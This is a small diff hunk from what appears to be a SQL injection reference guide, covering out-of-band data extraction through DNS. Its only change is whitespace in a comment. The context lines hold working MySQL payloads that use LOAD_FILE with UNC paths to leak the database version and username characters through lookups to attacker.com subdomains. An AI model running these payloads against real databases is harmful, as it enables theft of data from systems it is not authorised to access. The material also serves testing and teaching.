@@ -62,7 +62,7 @@ SELECT LOAD_FILE(CONCAT('\\\\', (SELECT VERSION()), '.version.attacker.com\\shar
 #### Data Extraction via DNS
 
 ```sql
--- Extract usernames character by character 
+-- Extract usernames character by character
 -- Extract first character of first username
 SELECT LOAD_FILE(CONCAT('\\\\', (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1), '.char1.attacker.com\\share\\file'));
 ```
